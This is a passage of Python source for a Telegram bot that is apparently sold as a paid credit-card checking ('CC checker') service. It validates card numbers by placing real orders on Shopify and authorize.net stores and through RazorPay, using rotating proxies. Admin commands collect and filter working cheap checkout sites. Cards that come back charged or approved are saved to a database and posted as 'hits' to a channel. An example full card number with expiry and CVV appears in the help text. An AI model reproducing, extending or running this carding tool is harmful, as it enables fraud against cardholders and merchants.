• Fᴀsᴛᴇsᴛ Eᴠᴇʀ
• 0 Eʀʀᴏʀs
• Cʜᴇᴄᴋs Eᴠᴇʀʏ Sɪɴɢʟᴇ CC
• Rᴇᴀʟ Oᴜᴛᴘᴜᴛ

📌 <b>Aᴘɪ :-</b>
<code>{API_BASE_URL}?cc=4017958000847584|10|2026|456&amp;site=https://msudairystore.com/</code>

📌 <b>Rᴇsᴘᴏɴsᴇ :-</b>
<code>{{"Currency":"USD","Gateway":"authorize.net","Price":"$4.0","Response":"ORDER_PLACED","Status":"Live"}}</code>

📌 <b>Eɴᴅᴘᴏɪɴᴛs :-</b>
• <code>/shopify?site=...&amp;cc=...&amp;proxy=...</code>
• <code>/status?</code>

<i>𝙀𝙣𝙟𝙤𝙮 𝘾𝘾 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 ☄️🔝</i>"""
    await styled_reply(event, text, buttons=[[pbtn(bs("Support"), url=OWNER_URL, style="primary")]], emoji_ids=[CE["bolt"], CE["chart"], CE["fire"], CE["link"], CE["info"]])


@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)


@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn(bs("Upgrade"), url=OWNER_URL, style="danger")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"""\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>\n{PE} <i>{bs('Contact admin')}</i>"""
    await styled_reply(event, plans_text, buttons=[[pbtn(bs("Upgrade"), url=OWNER_URL, style="danger")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    sites = await get_user_sites(event.sender_id)
    pc = await get_proxy_count(event.sender_id)
    plan_emoji = "🆓"
    for pi in PLANS.values():
        if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
    user_doc = await db["users"].find_one({"user_id": event.sender_id})
    expiry = user_doc.get("expiry") if user_doc else None
    exp_str = expiry.strftime('%Y-%m-%d') if expiry else bs("Never")
    status = bs("Active") if is_paid_plan(plan) else bs("Free")
    limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/{bs('day')} ({bs('group')})</code>"
    used_today = get_free_sp_usage(event.sender_id)
    usage_line = ""
    if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID:
        usage_line = f"\n{PE} <b>{bs('Used Today')}:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>"
    await styled_reply(event, f"""{PE} <b>{bs('Profile')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
{PE} <b>{bs('Status')}:</b> <code>{status}</code>
{PE} <b>{bs('Plan')}:</b> {plan_emoji} <b>{plan.upper()}</b>
{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>
{PE} <b>{bs('Limit')}:</b> {limit_text}{usage_line}
{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>
{PE} <b>{bs('Proxies')}:</b> <code>{pc}/{bs('100')}</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["globe"], CE["link"], CE["shield"]])


# ====================== SITES (ADMIN ONLY) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f: sta = extract_urls_from_text(await f.read())
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm and rm.text: sta = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if add_text:
            for s in extract_urls_from_text(add_text):
                if s not in sta: sta.append(s)
        if not sta:
            return await styled_reply(event, f"""{PE} <b>{bs('Add Site')}</b> {PE}\n{PE} <code>/add site.com</code>\n{PE} <i>{bs('Or reply .txt with')} </i><code>/add</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
        existing_norm = {normalize_site_url(s) for s in await get_user_sites(event.sender_id)}
        new_sites, already_exists = [], []
        for site in sta:
            n = normalize_site_url(site)
            if n in existing_norm: already_exists.append(n)
            elif n not in [normalize_site_url(s) for s in new_sites]: new_sites.append(n)
        if not new_sites:
            return await styled_reply(event, f"""{PE} <b>{bs('All sites already exist')}</b> {PE}\n{PE} <b>{bs('Duplicates')}:</b> <code>{len(already_exists)}</code>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
        uid = event.sender_id
        PENDING_ADD_SITES[uid] = {"sites": new_sites, "exists": already_exists, "event": event}
        kb = [[pbtn(f"{bs('0-5 USD')}", f"addprice:5:{uid}", style="success"), pbtn(f"{bs('0-10 USD')}", f"addprice:10:{uid}", style="success")],
              [pbtn(f"{bs('0-20 USD')}", f"addprice:20:{uid}", style="success"), pbtn(f"{bs('0-40 USD')}", f"addprice:40:{uid}", style="success")]]
        await styled_reply(event, f"""{PE} <b>{bs('Select Price Range')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>\n{PE} <b>{bs('Already Exist')}:</b> <code>{len(already_exists)}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <i>{bs('Only working sites within price range will be added')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True
    await event.answer(f"{bs('Testing sites')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data["exists"], max_price))


async def _process_add_sites(event, new_sites, already_exists, max_price):
    uid = event.sender_id
    total = len(new_sites); tested = working = dead = added_to_db = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]; working_sites_data = []
    def is_stopped(): return uid not in ACTIVE_ADD_PROCESSES
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: return
        last_ui[0] = now
        try: await styled_edit(sm, f"{PE} <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead}", emoji_ids=[CE["fire"]])
        except: pass
    async def test_worker(site):
        nonlocal tested, working, dead, added_to_db
        async with user_site_sem:
            if is_stopped(): return
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    working += 1
                    price_val = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: price_val = float(str(ps).replace('$', '').strip())
                        except: pass
                    working_sites_data.append({'site': site, 'response': res.get('response', '-'), 'price': ps, 'price_val': price_val})
                    if price_val <= max_price:
                        if await add_site_db(uid, site): added_to_db += 1
                else: dead += 1
                await update_ui()
            except asyncio.CancelledError: raise
            except: dead += 1; tested += 1
    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        if is_stopped(): break
        await asyncio.gather(*[asyncio.create_task(test_worker(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    try: await styled_edit(sm, f"""{PE} <b>{bs('Complete')}</b> {PE}\n{PE} <b>{bs('Working')}:</b> <code>{working}</code> | <b>{bs('Dead')}:</b> <code>{dead}</code> | <b>{bs('Added')} ($0-${max_price}):</b> <code>{added_to_db}</code>""", emoji_ids=[CE["fire"], CE["check"], CE["cross"], CE["chart"]])
    except: pass
    ACTIVE_ADD_PROCESSES.pop(uid, None)
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rt.lower() == 'all':
        existing = await get_user_sites(event.sender_id)
        if not existing: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
        c = 0
        for s in existing:
            if await remove_site_db(event.sender_id, s): c += 1
        return await styled_reply(event, f"{PE} <b>{bs('Removed')} {c} {bs('sites')}</b>", emoji_ids=[CE["check"]])
    if not rt: return await styled_reply(event, f"{PE} <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm: return await styled_reply(event, f"{PE} <b>{bs('No URLs')}</b>", emoji_ids=[CE["cross"]])
    existing = await get_user_sites(event.sender_id)
    removed = []
    for s in to_rm:
        n = normalize_site_url(s)
        for ex in existing:
            if normalize_site_url(ex) == n:
                if await remove_site_db(event.sender_id, ex): removed.append(ex)
                break
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    text = f"{PE} <b>{bs('Sites')}</b> ({len(sites)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1): text += f"{PE} <code>{i}.</code> <b>{s}</b>\n"; eid.append(CE["link"])
    if len(sites) > 50: text += f"\n<i>+{len(sites)-50} more</i>"
    await styled_reply(event, text, emoji_ids=eid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    uid = event.sender_id
    PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
    kb = [[pbtn(f"{bs('0-5 USD')}", f"siteprice:5:{uid}", style="success"), pbtn(f"{bs('0-10 USD')}", f"siteprice:10:{uid}", style="success")],
          [pbtn(f"{bs('0-20 USD')}", f"siteprice:20:{uid}", style="success"), pbtn(f"{bs('0-40 USD')}", f"siteprice:40:{uid}", style="success")]]
    await styled_reply(event, f"{PE} <b>{bs('Select Price Range')}</b> {PE}\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>\n{PE} <i>{bs('Dead + over-price will be removed')}</i>", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"]])


@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))


async def _process_site_check(event, sites, max_price):
    uid = event.sender_id
    total = len(sites); tested = alive_count = dead_count = kept_count = removed_price = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]; dead_sites = set(); price_removed_sites = set()
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: return
        last_ui[0] = now
        try: await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive_count} ❌{dead_count}", emoji_ids=[CE["fire"]])
        except: pass
    async def check_worker(site):
        nonlocal tested, alive_count, dead_count, kept_count, removed_price
        async with user_site_sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    alive_count += 1; pv = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$', '').strip())
                        except: pass
                    if pv <= max_price: kept_count += 1
                    else: removed_price += 1; price_removed_sites.add(normalize_site_url(site))
                else: dead_count += 1; dead_sites.add(normalize_site_url(site))
                await update_ui()
            except asyncio.CancelledError: raise
            except: dead_count += 1; tested += 1; dead_sites.add(normalize_site_url(site))
    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    for s in sites:
        n = normalize_site_url(s)
        if n in dead_sites or n in price_removed_sites: await remove_site_db(uid, s)
    try: await styled_edit(sm, f"""{PE} <b>{bs('Done')}</b> | ✅{alive_count} ❌{dead_count} | {bs('Kept')}:{kept_count} | {bs('Removed')}:{dead_count + removed_price}""", emoji_ids=[CE["fire"]])
    except: pass
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)


# ====================== PROXY ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8") as f: lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm.text: lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id)
        cc = await get_proxy_count(event.sender_id)
        if cc >= 100: return await styled_reply(event, f"{PE} <b>{bs('Limit 100/100')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing: parsed.append(pd); existing.add(pd['proxy_url'])
        if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:100-cc]
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added, failed = [], []
        for i in range(0, len(parsed), 10):
            batch = parsed[i:i+10]
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1)
                else: failed.append(1)
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | {bs('Total')}: {cc+len(added)}/100", emoji_ids=[CE["fire"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    text = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}/100) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; eid.append(CE["link"])
    if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} more</i>"
    text += f"\n{PE} <code>/rmpxy index</code>"; eid.append(CE["trash"])
    await styled_reply(event, text, emoji_ids=eid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}", emoji_ids=[CE["shield"]])


# ====================== FREE LIMITS ======================
async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group: await send_group_only_message(event); return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn(bs("Upgrade"), url=OWNER_URL, style="danger")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>", buttons=[[pbtn(bs("Upgrade"), url=OWNER_URL, style="danger")]])
            return False
    return True


def _get_card_from_event(event, reply_msg):
    card = None
    if reply_msg and reply_msg.text:
        cc = extract_cc(reply_msg.text)
        if cc: card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc: card = cc[0]
    return card


# ====================== /sp ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_sites(uid); proxies = await get_all_user_proxies(uid)
    else:
        sites, proxies = [], []
        for aid in ADMIN_ID:
            sites = await get_user_sites(aid); proxies = await get_all_user_proxies(aid)
            if sites: break
        if not sites:
            try:
                from database import get_global_sites
                sites = await get_global_sites()
            except: pass
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result, _ = await check_card_with_retry(card, sites, uid, proxies, 2, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '')))
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "Shopify"))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== /rz ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz\b'))
async def rz_single_check(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    proxies = await get_all_user_proxies(uid)
    if not proxies and uid not in ADMIN_ID and not is_paid_plan(plan):
        for aid in ADMIN_ID:
            proxies = await get_all_user_proxies(aid)
            if proxies: break
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    try:
        http_session = await get_user_http_session(uid, "rz")
        bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
        result = await check_rz_with_retry(card, proxies, uid, max_retries=2, http_session=http_session)
        bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'RazorPay', '-'))
        msg, eid = format_rz_single_result(status, card, 'RazorPay', result.get('Response', '')[:150], bi, elapsed)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay"))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== /stop ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    stopped_any = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES]:
        proc = store.get(uid)
        if proc and isinstance(proc, dict):
            proc["stopped"] = True
            for task in proc.get("tasks", []):
                if not task.done(): task.cancel()
            stopped_any = True
    if not stopped_any: return await styled_reply(event, f"{PE} <b>{bs('No active session')}</b>", emoji_ids=[CE["warn"]])
    await styled_reply(event, f"{PE} <b>{bs('Stopping')}...</b>", emoji_ids=[CE["stop"]])


# ====================== GENERIC MASS PROCESSOR ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    uid = event.sender_id
    try: sender = await event.get_sender(); username, name = sender.username or f"user_{uid}", sender.first_name or "User"
    except: username, name = f"user_{uid}", "User"
    total = len(cards); checked = charged = approved = declined = errors = 0
    mode = bs("C+A") if send_approved else bs("C only")
    st = time.time()
    charged_cards = []; approved_cards = []; declined_cards = []; error_cards = []; dead_cards = []
